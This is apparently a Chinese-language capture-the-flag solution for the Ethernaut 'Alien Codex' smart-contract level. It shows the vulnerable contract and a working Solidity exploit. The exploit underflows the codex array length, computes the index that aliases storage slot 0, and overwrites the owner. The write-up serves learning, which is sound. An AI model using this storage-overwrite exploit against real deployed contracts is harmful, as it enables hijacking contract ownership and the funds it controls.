# Alien Codex
## 題目
<img width="514" alt="截圖 2024-09-20 下午10 40 21" src="https://github.com/user-attachments/assets/fa48da0b-6aa1-4961-8238-8289086f941c">


## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

### 合約細節：
- **`contact` (bool)**：這個變量控制你能不能操作某些函數。
- **`codex` (bytes32[])**：一個 `bytes32` 型態的動態數組。
- **重要函數**：
  - **`makeContact()`**：這個函數會把 `contact` 變為 `true`，允許你使用其他受限函數。
  - **`record()`**：這個可以往 `codex` 裡新增一個 `bytes32` 值。
  - **`retract()`**：用來減少 `codex` 數組的長度。
  - **`revise()`**：允許你修改 `codex` 裡面某個特定的元素，但前提是 `contact` 必須為 `true`。



## hack
```solidity
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            // h + i = 0 = 2**256
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}
```

1. 使用 `makeContact()` 函數打開 `contact` 開關，這樣就能訪問其他函數。
2. 使用 `retract()` 函數把 `codex` 的長度縮到 0，讓我們可以越界操作數組。
3. 計算出 `owner` 的存儲槽位，然後用 `revise()` 函數去覆蓋它。

數組的第一個元素 `codex[0]` 的存儲位置是這樣算的：
```
keccak256(1)
```
`codex[0]` 的存儲槽位就是 `keccak256(1)` 算出來的結果。

但我們想要的是槽位 `0`，也就是 `owner` 變數的位子，因此我們需要找到一個索引 `i`，讓：
```
keccak256(1) + i = 0
```
解出來的結果是：
```
i = 0 - keccak256(1)
```
## ans
1. 呼叫 `makeContact()` 打開訪問權限。
2. 呼叫 `retract()` 把數組長度減少，讓我們可以訪問到任何索引。
3. 計算出可以覆蓋 `owner` 的索引值 `i`。
4. 用 `revise(i, new_owner)` 把 `owner` 改成我們的地址。
